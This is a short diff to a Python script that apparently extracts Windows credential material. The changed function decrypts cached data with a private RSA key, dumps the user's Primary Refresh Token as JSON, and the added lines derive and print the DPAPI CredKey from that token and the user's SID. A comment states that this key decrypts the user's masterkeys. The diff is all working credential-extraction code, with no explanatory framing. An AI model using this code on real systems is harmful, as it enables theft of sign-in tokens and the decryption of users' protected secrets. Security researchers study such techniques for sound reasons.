@@ -1,5 +1,7 @@
 #!/usr/bin/env python3
 import struct
+import hmac
+import hashlib
 import json
 from typing import List
 import hexdump
@@ -231,7 +233,18 @@ def decrypt_cachedata_with_private_key(file_path, rsa_priv_key_blob):
     hexdump.hexdump(dpapi_cred_key_blob_obj.CredKey)
     decrypted_prt = decrypted_blob[0x10+raw_dpapi_cred_key_size:]
 
+    # Remove encryption padding
+    decrypted_prt_end = decrypted_prt.rfind(b'}')
+    assert decrypted_prt_end != -1
+    decrypted_prt = decrypted_prt[:decrypted_prt_end+1]
     print("[+] Dumping decrypted PRT file:")
     prt_dict = json.loads(decrypted_prt)
     print(json.dumps(prt_dict, indent=4))
-    print("\n")
+
+    # Derive the CredKey. Serves as the base secret to decrypt the masterkeys of the user.
+    key = hashlib.sha1(dpapi_cred_key_blob_obj.CredKey).digest()
+    sid = prt_dict['UserInfo']['PrimarySid']
+    encoded_sid = (sid + '\0').encode('UTF-16-LE')
+    key = hmac.new(key, encoded_sid, hashlib.sha1).hexdigest()
+    print(f'[+] Derived CredKey: {key} for sid: {sid}')
+
